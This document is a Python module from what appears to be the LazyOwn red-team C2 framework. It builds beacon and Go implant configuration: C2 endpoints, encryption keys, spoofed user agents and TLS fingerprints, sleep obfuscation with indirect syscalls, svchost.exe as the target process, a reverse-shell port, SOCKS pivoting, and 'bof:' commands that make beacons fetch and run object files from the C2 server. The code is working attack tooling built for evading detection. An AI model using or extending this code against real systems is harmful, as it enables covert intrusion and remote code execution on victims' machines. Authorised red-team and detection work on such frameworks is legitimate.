"""Beacon configuration builder — wires profile engines into beacon compile-time config.

This module bridges the C2 profile engine, sleep obfuscation engine, socks proxy
engine, and BOF registry into concrete `#define` directives and template variables
that ``gen_beacon.sh`` and ``c2_builder.py`` consume to produce profile-aware beacons.

Contracts:
    - BeaconConfig: dataclass holding all beacon compile-time definitions
    - BeaconConfigBuilder: builds a BeaconConfig from payload + engine state
    - generate_beacon_profile_args: produces CLI args for gen_beacon.sh
    - generate_go_implant_template_vars: produces template context for Go implant
    - generate_bof_execution_command: produces ``bof:<url>`` commands for beacons

Design (SOLID):
    - Single Responsibility: only concerns compile-time config generation
    - Open/Closed: new engines registered via dict, not code changes
    - Liskov: all engine outputs are dicts, safely composable
    - Interface Segregation: outputs are separate for C beacon vs Go implant
    - Dependency Inversion: depends on engine interfaces, not concrete beacons

Usage:
    from modules.beacon_config_builder import BeaconConfigBuilder

    builder = BeaconConfigBuilder.from_payload(payload)
    config = builder.build()
    args = config.to_gen_beacon_args()
    go_vars = config.to_go_implant_vars()
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any

log = logging.getLogger("beacon_config_builder")

C2_PROTOCOL_HTTPS = "https"
C2_PROTOCOL_HTTP = "http"
BEACON_CONFIG_JSON_PATH = "sessions/implant_config_{name}.json"
_DOWNLOAD_SEGMENT = "download"


@dataclass
class BeaconConfig:
    """Complete beacon compile-time configuration.

    All fields map directly to ``#define`` directives in ``gen_beacon.sh``
    or template variables in the Go implant.
    """

    name: str = "beacon"
    c2_url: str = "https://127.0.0.1:4444"
    c2_host: str = "127.0.0.1"
    c2_port: int = 4444
    c2_user: str = ""
    c2_pass: str = ""
    malleable_route: str = "/"
    client_id: str = "beacon"
    aes_key_hex: str = ""

    sleep_base_ms: int = 6000
    min_jitter_pct: int = 30
    max_jitter_pct: int = 60
    max_retries: int = 3

    user_agent: str = ""
    user_agent_1: str = ""
    user_agent_2: str = ""
    user_agent_3: str = ""

    url_traffic_1: str = ""
    url_traffic_2: str = ""
    url_traffic_3: str = ""

    tls_enabled: bool = True
    tls_min_version: str = "1.2"
    tls_cipher_suites: list[str] = field(default_factory=list)
    tls_sni_hostname: str = ""
    tls_ja3_hash: str = ""
    tls_grease_enabled: bool = True

    dns_enabled: bool = False
    dns_domain: str = ""
    dns_encoding: str = "base64"
    dns_poll_interval_ms: int = 10000
    dns_ttl_bypass: bool = True

    websocket_enabled: bool = False
    websocket_path: str = "/ws/connect"
    websocket_heartbeat_ms: int = 30000
    websocket_compression: bool = True

    smb_enabled: bool = False
    smb_pipe_name: str = ""

    sleep_obfuscation_enabled: bool = False
    sleep_obfuscation_technique: str = ""
    sleep_encrypt_heap: bool = True
    sleep_encrypt_stack: bool = True
    sleep_indirect_syscalls: bool = True
    sleep_rwx_rw_cycle: bool = True
    sleep_detection_resistance: int = 0

    socks_proxy_enabled: bool = False
    socks_bind_address: str = "127.0.0.1"
    socks_bind_port: int = 1080
    socks_max_connections: int = 32

    output_binary: str = "beacon.exe"
    xor_key_hex: str = "0x33"
    target_process: str = "svchost.exe"
    stealth_mode: bool = True
    beacon_scan_ports: list[int] = field(default_factory=lambda: [22, 80, 443, 445, 3389, 8080, 8443])
    reverse_shell_port: int = 5555
    enable_debug: bool = False

    def to_gen_beacon_args(self) -> list[str]:
        """Produce CLI arguments for gen_beacon.sh."""
        args = [
            f"--url={self.c2_url}",
            f"--maleable={self.malleable_route}",
            f"--client-id={self.client_id}",
            f"--c2-host={self.c2_host}",
            f"--c2-user={self.c2_user or 'LazyOwn'}",
            f"--c2-pass={self.c2_pass or 'LazyOwn'}",
            f"--c2-port={self.c2_port}",
            f"--aes-key={self.aes_key_hex}",
            f"--user-agent={self.user_agent}",
            f"--user-agent1={self.user_agent_1 or self.user_agent}",
            f"--user-agent2={self.user_agent_2 or self.user_agent}",
            f"--user-agent3={self.user_agent_3 or self.user_agent}",
            f"--key={self.xor_key_hex}",
            f"--output={self.output_binary}",
        ]
        return args

    def to_go_implant_vars(self) -> dict[str, Any]:
        """Produce template variables for the Go implant builder."""
        return {
            "lhost": self.c2_host,
            "lport": str(self.c2_port),
            "line": self.client_id,
            "sleep": str(self.sleep_base_ms // 1000),
            "maleable": self.malleable_route,
            "key": self.aes_key_hex,
            "useragent": self.user_agent,
            "user_agent_1": self.user_agent_1 or self.user_agent,
            "user_agent_2": self.user_agent_2 or self.user_agent,
            "user_agent_3": self.user_agent_3 or self.user_agent,
            "url_traffic_1": self.url_traffic_1,
            "url_traffic_2": self.url_traffic_2,
            "url_traffic_3": self.url_traffic_3,
            "stealth": str(self.stealth_mode),
            "sleep_obfuscation": str(self.sleep_obfuscation_enabled),
            "sleep_technique": self.sleep_obfuscation_technique,
            "socks_bind_port": str(self.socks_bind_port),
            "socks_enabled": str(self.socks_proxy_enabled),
        }

    def to_config_json(self) -> dict[str, Any]:
        """Produce the config.json that beacons fetch on startup."""
        return {
            "reverse_shell_port": self.reverse_shell_port,
            "rhost": self.c2_host,
            "enable_c2_implant_debug": str(self.enable_debug),
            "beacon_scan_ports": self.beacon_scan_ports,
            "sleep_base_ms": self.sleep_base_ms,
            "min_jitter_pct": self.min_jitter_pct,
            "max_jitter_pct": self.max_jitter_pct,
            "malleable_route": self.malleable_route,
            "tls_enabled": self.tls_enabled,
            "tls_ja3_hash": self.tls_ja3_hash,
            "dns_enabled": self.dns_enabled,
            "dns_domain": self.dns_domain,
            "dns_encoding": self.dns_encoding,
            "websocket_enabled": self.websocket_enabled,
            "sleep_obfuscation_enabled": self.sleep_obfuscation_enabled,
            "sleep_technique": self.sleep_obfuscation_technique,
            "sleep_detection_resistance": self.sleep_detection_resistance,
            "socks_enabled": self.socks_proxy_enabled,
            "socks_bind_address": self.socks_bind_address,
            "socks_bind_port": self.socks_bind_port,
        }

    def to_dict(self) -> dict[str, Any]:
        """Full serialization of beacon config."""
        return {
            "name": self.name,
            "c2_url": self.c2_url,
            "c2_host": self.c2_host,
            "c2_port": self.c2_port,
            "malleable_route": self.malleable_route,
            "client_id": self.client_id,
            "aes_key_hex": self.aes_key_hex[:16] + "...",
            "sleep_base_ms": self.sleep_base_ms,
            "min_jitter_pct": self.min_jitter_pct,
            "max_jitter_pct": self.max_jitter_pct,
            "user_agent": self.user_agent,
            "tls": {
                "enabled": self.tls_enabled,
                "min_version": self.tls_min_version,
                "ja3_hash": self.tls_ja3_hash,
                "grease": self.tls_grease_enabled,
            },
            "dns": {
                "enabled": self.dns_enabled,
                "domain": self.dns_domain,
                "encoding": self.dns_encoding,
            },
            "websocket": {
                "enabled": self.websocket_enabled,
                "path": self.websocket_path,
            },
            "smb": {
                "enabled": self.smb_enabled,
                "pipe_name": self.smb_pipe_name,
            },
            "sleep_obfuscation": {
                "enabled": self.sleep_obfuscation_enabled,
                "technique": self.sleep_obfuscation_technique,
                "encrypt_heap": self.sleep_encrypt_heap,
                "encrypt_stack": self.sleep_encrypt_stack,
                "indirect_syscalls": self.sleep_indirect_syscalls,
                "detection_resistance": self.sleep_detection_resistance,
            },
            "socks_proxy": {
                "enabled": self.socks_proxy_enabled,
                "bind_address": self.socks_bind_address,
                "bind_port": self.socks_bind_port,
                "max_connections": self.socks_max_connections,
            },
            "stealth_mode": self.stealth_mode,
            "beacon_scan_ports": self.beacon_scan_ports,
        }


class BeaconConfigBuilder:
    """Builds BeaconConfig from payload and engine state.

    Composes data from ``payload.json``, ``modules/c2_profile_engine``,
    ``modules/sleep_obfuscation``, and ``modules/socks_proxy`` into a
    single BeaconConfig ready for beacon compilation.
    """

    def __init__(self, payload: dict[str, Any]) -> None:
        self._payload = payload

    def build(self, name: str | None = None) -> BeaconConfig:
        """Build a complete BeaconConfig.

        Args:
            name: Optional beacon name override (uses payload line if not set).

        Returns:
            A fully populated BeaconConfig.
        """
        p = self._payload
        rhost = p.get("rhost", "127.0.0.1")
        lhost = p.get("lhost", "127.0.0.1")
        c2_port = int(p.get("c2_port", 4444))
        protocol = C2_PROTOCOL_HTTPS if p.get("enable_https", True) else C2_PROTOCOL_HTTP
        c2_url = f"{protocol}://{lhost}:{c2_port}"
        malleable = p.get("c2_malleable_route", "/")
        if not malleable.endswith("/"):
            malleable += "/"
        beacon_name = name or str(p.get("line", "beacon"))
        aes_key_hex = p.get("aes_key", "")
        if not aes_key_hex:
            try:
                from core.config import resolve_aes_key

                aes_key_hex = resolve_aes_key(p, sessions_dir="sessions")
            except Exception:
                aes_key_hex = ""
        user_agent = p.get(
            "user_agent_win",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        )
        user_agent_1 = p.get("user_agent_1", "")
        user_agent_2 = p.get("user_agent_2", "")
        user_agent_3 = p.get("user_agent_3", "")
        sleep_ms = int(p.get("sleep", 6)) * 1000

        config = BeaconConfig(
            name=beacon_name,
            c2_url=c2_url,
            c2_host=lhost,
            c2_port=c2_port,
            c2_user=p.get("c2_user", "LazyOwn"),
            c2_pass=p.get("c2_pass", "LazyOwn"),
            malleable_route=malleable,
            client_id=beacon_name,
            aes_key_hex=aes_key_hex,
            sleep_base_ms=sleep_ms,
            min_jitter_pct=30,
            max_jitter_pct=60,
            user_agent=user_agent,
            user_agent_1=user_agent_1,
            user_agent_2=user_agent_2,
            user_agent_3=user_agent_3,
            url_traffic_1=p.get("url_traffic_1", ""),
            url_traffic_2=p.get("url_traffic_2", ""),
            url_traffic_3=p.get("url_traffic_3", ""),
            stealth_mode=True,
            beacon_scan_ports=[22, 80, 443, 445, 3389, 8080, 8443],
            reverse_shell_port=int(p.get("reverse_shell_port", 5555)),
            enable_debug=bool(p.get("enable_c2_implant_debug", False)),
            output_binary=f"{beacon_name}.exe",
            xor_key_hex="0x33",
        )

        self._inject_profile_engine(config)
        self._inject_sleep_engine(config)
        self._inject_socks_engine(config)

        return config

    def _inject_profile_engine(self, config: BeaconConfig) -> None:
        """Hydrate TLS, DNS, SMB, WebSocket configs from ProfileEngine."""
        try:
            from modules.c2_profile_engine import (
                DnsProfile,  # noqa: F401
                ProfileEngine,
                SmbProfile,  # noqa: F401
                TlsProfile,  # noqa: F401
                WebSocketProfile,  # noqa: F401
            )
        except ImportError:
            return

        raw = self._payload
        engine = ProfileEngine.from_dict(
            {
                "c2_tls": raw.get("c2_tls", {}),
                "c2_dns": raw.get("c2_dns", {}),
                "c2_smb": raw.get("c2_smb", {}),
                "c2_websocket": raw.get("c2_websocket", {}),
            }
        )

        tls = engine.tls_profile
        config.tls_enabled = tls.enabled
        config.tls_min_version = tls.min_version
        config.tls_cipher_suites = tls.get_cipher_suites()
        config.tls_sni_hostname = tls.sni_hostname
        config.tls_ja3_hash = tls.get_ja3_hash()
        config.tls_grease_enabled = tls.grease_extensions

        dns = engine.dns_profile
        config.dns_enabled = dns.enabled
        config.dns_domain = dns.domain
        config.dns_encoding = dns.encoding
        config.dns_poll_interval_ms = dns.poll_interval_ms
        config.dns_ttl_bypass = dns.ttl_cache_bypass

        ws = engine.websocket_profile
        config.websocket_enabled = ws.enabled
        config.websocket_path = ws.path
        config.websocket_heartbeat_ms = ws.heartbeat_interval_ms
        config.websocket_compression = ws.use_compression

        smb = engine.smb_profile
        config.smb_enabled = smb.enabled
        config.smb_pipe_name = smb.pipe_name

    def _inject_sleep_engine(self, config: BeaconConfig) -> None:
        """Hydrate sleep obfuscation config from SleepObfuscationEngine."""
        try:
            from modules.sleep_obfuscation import SleepObfuscationEngine
        except ImportError:
            return

        engine = SleepObfuscationEngine()
        sleep_cfg = engine.config
        if not sleep_cfg.enabled:
            return
        config.sleep_obfuscation_enabled = True
        config.sleep_obfuscation_technique = sleep_cfg.technique_name
        config.sleep_encrypt_heap = sleep_cfg.encrypt_heap
        config.sleep_encrypt_stack = sleep_cfg.encrypt_stack
        config.sleep_indirect_syscalls = sleep_cfg.indirect_syscalls
        config.sleep_rwx_rw_cycle = sleep_cfg.rwx_to_rw_cycle
        config.sleep_detection_resistance = engine.detection_resistance

    def _inject_socks_engine(self, config: BeaconConfig) -> None:
        """Hydrate SOCKS proxy config from SocksProxyEngine."""
        try:
            from modules.socks_proxy import SocksProxyEngine
        except ImportError:
            return

        socks_raw = self._payload.get("socks_proxy", {})
        if not socks_raw:
            return
        engine = SocksProxyEngine.from_dict(socks_raw)
        socks_cfg = engine.config
        config.socks_proxy_enabled = True
        config.socks_bind_address = socks_cfg.bind_address
        config.socks_bind_port = socks_cfg.bind_port
        config.socks_max_connections = socks_cfg.max_connections

    @classmethod
    def from_payload(cls, payload: dict[str, Any]) -> BeaconConfigBuilder:
        """Build a BeaconConfigBuilder from a payload dictionary."""
        return cls(payload)

    @classmethod
    def from_payload_file(cls, path: str = "payload.json") -> BeaconConfigBuilder:
        """Build a BeaconConfigBuilder by loading payload.json from disk."""
        import json as _json

        with open(path, "r") as f:
            return cls(_json.load(f))


_BOFS_URL_SEGMENT = "bofs"
_DOWNLOAD_SEGMENT = "download"
_CLIENT_ID_MAX_LENGTH = 128
_CLIENT_ID_ALLOWED = re.compile(r"^[A-Za-z0-9_-]{1,128}$")
_URL_TOKEN_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/-]{0,64}$")


def sanitize_client_id(client_id: str) -> str:
    """Return a strict beacon client id safe for URLs and file paths.

    The beacon protocol identifies sessions with a client id that also
    becomes a file name on the C2; only alphanumerics, hyphen and
    underscore are allowed.

    Args:
        client_id: Raw operator-supplied beacon id.

    Returns:
        The cleaned id.

    Raises:
        ValueError: When the id is empty or contains other characters.
    """
    cleaned = "".join(c for c in str(client_id or "") if c.isalnum() or c in "-_")
    if not cleaned or len(cleaned) > _CLIENT_ID_MAX_LENGTH:
        raise ValueError(f"invalid beacon client id: {client_id!r}")
    if cleaned != client_id or not _CLIENT_ID_ALLOWED.match(cleaned):
        raise ValueError(f"beacon client id must match {_CLIENT_ID_ALLOWED.pattern}: {client_id!r}")
    return cleaned


def generate_bof_execution_command(
    bof_name: str,
    c2_url: str,
    args: list[str] | None = None,
    bofs_dir: str = _BOFS_URL_SEGMENT,
) -> str:
    """Generate a ``bof:<url>[ <args>]`` command that a beacon executes.

    Both beacon interpreters (the Windows COFFLoader beacon and the
    BlackSandBeacon ELF loader) parse the payload ``bof:`` prefix, then
    the URL, then a single space, then the argument string. Everything
    after the first space is passed verbatim to the BOF ``go`` entry
    point as the argument buffer, so arguments are joined with commas.

    Args:
        bof_name: BOF catalog name (e.g., ``ldap_enum``).
        c2_url: C2 base URL (e.g., ``https://10.10.14.1:4444``).
        args: Optional arguments to pass to the BOF as one comma-joined string.
        bofs_dir: URL segment under ``/download/`` that serves the BOF.

    Returns:
        A command string like ``bof:https://10.10.14.1:4444/download/bofs/ldap_enum``
        or ``bof:.../bofs/portscan 10.0.0.7,80,110`` when args are given.

    Raises:
        ValueError: When ``bof_name``, ``bofs_dir`` or an arg contains
            characters that would break the ``bof:`` payload contract.
    """
    _validate_bof_token(bof_name, "bof_name", url_token=True)
    _validate_bof_token(bofs_dir, "bofs_dir", url_token=True)
    bof_path = f"{c2_url}/{_DOWNLOAD_SEGMENT}/{bofs_dir}/{bof_name}"
    cmd = f"bof:{bof_path}"
    if args:
        arg_str = ",".join(a.strip() for a in args if str(a).strip())
        if arg_str:
            _validate_bof_token(arg_str, "args")
            cmd = f"{cmd} {arg_str}"
    return cmd


def _validate_bof_token(token: str, label: str, *, url_token: bool = False) -> None:
    """Reject tokens that would corrupt the ``bof:`` payload contract.

    The payload is URL + optional space + argument buffer. A URL token
    (``bof_name`` and ``bofs_dir``) must match the URL-safe slug grammar
    because the beacon splits the URL from the args at the first space;
    argument strings only must stay free of control characters and
    newlines.

    Args:
        token: Value to validate.
        label: Field name for the error message.
        url_token: When True enforce the strict URL grammar.

    Raises:
        ValueError: When the token is unsafe.
    """
    text = str(token or "")
    if not text or not text.strip():
        raise ValueError(f"{label} must not be empty")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in text):
        raise ValueError(f"{label} contains control characters: {token!r}")
    if text != text.strip():
        raise ValueError(f"{label} has surrounding whitespace: {token!r}")
    if url_token and not _URL_TOKEN_RE.match(text):
        raise ValueError(f"{label} must match {_URL_TOKEN_RE.pattern}: {token!r}")


__all__ = [
    "BeaconConfig",
    "BeaconConfigBuilder",
    "generate_bof_execution_command",
    "sanitize_client_id",
]
